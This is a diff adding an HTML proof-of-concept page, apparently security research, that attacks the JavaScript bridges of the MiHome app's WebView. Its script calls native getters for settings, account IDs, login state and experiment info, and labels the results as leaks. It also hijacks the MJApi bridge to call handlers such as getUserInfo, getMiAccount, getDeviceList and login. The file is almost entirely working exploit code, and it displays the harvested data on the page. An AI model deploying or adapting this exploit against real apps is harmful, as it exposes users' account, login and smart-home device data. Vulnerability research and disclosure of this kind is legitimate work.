@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MiHome PoC v2</title>
+<style>
+  body{font-family:-apple-system,sans-serif;background:#fff;margin:0;padding:12px;color:#111}
+  h3{margin:0 0 6px;font-size:15px}
+  #out{white-space:pre-wrap;word-break:break-all;font-size:11px;line-height:1.45;
+       background:#f6f6f6;border:1px solid #ddd;padding:9px;border-radius:6px;min-height:300px}
+  .ok{color:#0a0;font-weight:bold} .warn{color:#c00}
+</style>
+</head>
+<body>
+<h3>⚠️ MiHome WebView · device-control bridge data exfil (PoC v2)</h3>
+<div id="out">init…</div>
+<script>
+(function(){
+  var out=document.getElementById('out'), log=[];
+  function push(l){ log.push(l); out.textContent=log.join('\n'); }
+  function safe(v){ try{return (typeof v==='object')?JSON.stringify(v):String(v);}catch(e){return String(v);} }
+  push('[UA] '+navigator.userAgent);
+  push('[URL] '+location.href);
+
+  // bridge presence
+  ['MJApi','_native_interface','_cloud_video_interface','mihomeJsBridge','statusBarApi'].forEach(function(n){
+    try{push(n+' : '+typeof window[n]);}catch(e){}
+  });
+
+  // === _native_interface: SYNCHRONOUS getters (return data directly, no callback) ===
+  var ni=window._native_interface;
+  if(ni && typeof ni==='object'){
+    push('\n=== _native_interface synchronous data leak ===');
+    function call(m,arg){
+      try{ var r=(arg!==undefined)?ni[m](arg):ni[m](); push('[LEAK] '+m+'() => '+safe(r)); }
+      catch(e){ push('[err] '+m+'(): '+e); }
+    }
+    call('getSettings');      // app/user settings JSON
+    call('getActiveIds');     // active ids (account/home)
+    call('isLogin');          // login state
+    call('getAllExpInfo');    // experiment/account info
+    call('getLocale');        // locale
+    call('getNetworkType');   // network type
+    call('webviewStatus','{}');
+  } else { push('\n_native_interface not present'); }
+
+  // === MJApi: callJavaHandler probe (async callback) ===
+  var nativeMJApi=window.MJApi;
+  if(nativeMJApi && typeof nativeMJApi.callJavaHandler==='function'){
+    window.MJApi={ _handleMessageFromNative:function(msg){ push('[<-MJApi] '+safe(msg)); },
+                   callJavaHandler:function(n,p,c){return nativeMJApi.callJavaHandler(n,p,c);} };
+    push('\n=== MJApi callJavaHandler ===');
+    ['getDeviceInfo','getUserInfo','getAccountInfo','getMiAccount','getDeviceList','memberResponse','login']
+      .forEach(function(n){ try{nativeMJApi.callJavaHandler(n,'{}','cb_'+n); push('[call->] '+n);}catch(e){} });
+  }
+})();
+</script>
+</body>
+</html>
